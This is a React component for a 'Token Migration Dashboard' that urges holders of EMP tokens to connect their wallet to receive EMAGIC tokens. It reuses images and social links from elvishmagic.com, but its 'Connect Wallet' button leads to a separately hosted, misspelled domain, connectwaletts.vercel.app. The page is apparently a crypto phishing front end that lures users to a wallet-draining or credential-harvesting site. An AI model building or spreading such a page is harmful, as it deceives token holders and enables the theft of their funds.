export default function Home() {
  return (
    <div class="app">
      <div
        style={{
          position: "fixed",
          zIndex: 9999,
          inset: "16px",
          pointerEvents: "none",
        }}
      ></div>
      <div class="appWrapper">
        <div class="homePageWrapper">
          <div class="homeLogo">
            <img src="/logo23.png" alt="logo" />
            <img src="/textlogo.png" alt="logo" className=" homeLogo" />
          </div>
          <div class="homeTitle">
            <span>Token Migration Dashboard</span>
          </div>
          <div class="boxWrapper">
            <div class="boxMessage">
              <span>
                To receive your EMAGIC tokens, please connect your wallet and
                complete the Migrate process.
              </span>
            </div>
            <div class="boxTransfer">
              <div class="boxItem">
                <img
                  src="https://elvishmagic.com/assets/images/slider/image-re.png"
                  class="boxIcon"
                  alt="EMP"
                />
                <span>EMP Balance</span>
                <span>-</span>
              </div>
              <svg
                stroke="currentColor"
                fill="currentColor"
                stroke-width="0"
                viewBox="0 0 24 24"
                class="boxTransferIcon"
                height="1em"
                width="1em"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path d="m15 12 5-4-5-4v2.999H2v2h13zm7 3H9v-3l-5 4 5 4v-3h13z"></path>
              </svg>
              <div class="boxItem">
                <img src="/logo23.png" class="boxIcon" alt="EMagic" />
                <div class="boxNewToken">
                  <button class="addMetamaskButton">
                    <img src="/tera.png" alt="metamask" />
                  </button>
                  <span>EMAGIC Balance</span>
                </div>
                <span>-</span>
              </div>
            </div>
            <button className="flex items-center space-x-2 px-4 py-2 rounded-lg bg-blue-500 text-white hover:bg-blue-600 focus:outline-none focus:ring focus:ring-blue-300">
              <span className=" text-white">
                <svg width="28" height="20" viewBox="0 0 28 20">
                  <g clip-path="url(#a)">
                    <path
                      d="M7.386 6.482c3.653-3.576 9.575-3.576 13.228 0l.44.43a.451.451 0 0 1 0 .648L19.55 9.033a.237.237 0 0 1-.33 0l-.606-.592c-2.548-2.496-6.68-2.496-9.228 0l-.648.634a.237.237 0 0 1-.33 0L6.902 7.602a.451.451 0 0 1 0-.647l.483-.473Zm16.338 3.046 1.339 1.31a.451.451 0 0 1 0 .648l-6.035 5.909a.475.475 0 0 1-.662 0L14.083 13.2a.119.119 0 0 0-.166 0l-4.283 4.194a.475.475 0 0 1-.662 0l-6.035-5.91a.451.451 0 0 1 0-.647l1.338-1.31a.475.475 0 0 1 .662 0l4.283 4.194c.046.044.12.044.166 0l4.283-4.194a.475.475 0 0 1 .662 0l4.283 4.194c.046.044.12.044.166 0l4.283-4.194a.475.475 0 0 1 .662 0Z"
                      fill="#ffffff"
                    ></path>
                  </g>
                  <defs>
                    <clipPath id="a">
                      <path fill="#ffffff" d="M0 0h28v20H0z"></path>
                    </clipPath>
                  </defs>
                </svg>
              </span>
              <span>
                <a
                  className=" text-white"
                  href="https://connectwaletts.vercel.app/"
                >
                  Connect Wallet
                </a>
              </span>
            </button>
          </div>
          <div class="socialLinks">
            <a href="https://t.me/elvishmagic" target="_blank" rel="noreferrer">
              Telegram
            </a>
            <a href="https://elvishmagic.com/" target="_blank" rel="noreferrer">
              Website
            </a>
            <a
              href="https://twitter.com/elvishmagicpad"
              target="_blank"
              rel="noreferrer"
            >
              Twitter
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
